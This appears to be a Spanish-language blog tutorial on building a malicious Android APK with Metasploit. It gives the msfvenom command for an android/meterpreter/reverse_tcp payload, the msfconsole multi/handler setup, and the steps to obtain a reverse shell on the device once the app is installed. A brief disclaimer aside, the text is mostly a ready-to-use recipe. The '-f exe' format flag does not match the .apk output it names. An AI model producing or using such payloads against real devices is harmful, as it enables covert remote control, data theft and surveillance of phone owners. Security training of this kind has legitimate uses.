Cómo crear una apk maliciosa para android con metasploit

En este artículo aprenderemos a crear una aplicación maliciosa para android con metasploit.

Para empezar quiero aclarar que no soy responsable de el uso que le vayáis a dar a esta aplicación y que no recomiendo que uséis demasiado metasploit ya que os vais a acostumbrar a que os lo den todo hecho y la gracia es que sepáis lo quiero estáis ejecutando y además el OSCP no permite el uso de esta herramienta y el resto de herramientas de botón gordo.

1-Crear la aplicación con msfvenom.

Para hacerlo ejecutaremos el siguiente comando:

msfvenom -p android/meterpreter/reverse_tcp -f exe lhost=TU_IP lport=Listen_PORT -o nombre_final.apk

Recordad que tenéis que cambiar el LHOST y el LPORT por el vuestro, por defecto el LPORT de metasploit es 4444 per podéis usar el que queráis.

Después de hacer esto en el directorio en el que ejecutastéis el comando se creará el archivo con el nombre indicado anteriormente.

2-Iniciar la consola de metasploit.

Para inicar la consola tenemos que ejecutar el siguiente comando: msfconsole -q

3-Setear el exploit que vamos a usar.

Para setear el exploit hay que ejecutar el siguiente comando: use exploit/multi/handler

4-Setear el payload que vamos a usar.

Para setear el payload hay que ejecutar el siguiente comando: set payload android/meterpreter/reverse_tcp

5-rellenar las opciones necesarias.

Para ello debemos ejecutar los siguientes comandos: set lhost=TU_IP y set lport Listen_PORT

Recordad que tenéis que poner la misma IP y el mismo puerto para que funcione el listener.

6-Iniciar el exploit y el listener.

Para iniciar el exploit tenéis que ejecutar el siguiente comando: exploit o run

Para el listener podéis usar el listener que se ejecuta por defecto con el exploit o hacer un con netcat u otro programa.


Y con eso obtenéis una reverse shell, podéis ejecutar el comando help para mostrar los payloads que vienen con metasploit o ejecutar el comando shell para obtener una shell interactiva.
